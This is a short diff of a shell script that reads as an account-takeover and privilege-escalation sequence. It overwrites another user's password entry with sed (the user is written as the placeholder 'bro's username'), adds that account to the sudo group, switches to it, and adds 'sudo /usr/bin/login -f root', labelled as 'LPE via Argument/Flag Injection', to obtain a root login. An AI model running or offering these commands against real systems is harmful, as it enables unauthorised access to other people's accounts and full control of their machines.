@@ -9,4 +9,8 @@ sudo sed -i 's|^(bro's username goes here):[^:]*|(bro's username goes here):(str
 # Add them to /etc/sudoers 
 sudo usermod -aG sudo (bro's username)
 
-su 9
+# Log in
+su (bro's username) 
+
+# LPE via Argument/Flag Injection (enter your password you set)
+sudo /usr/bin/login -f root
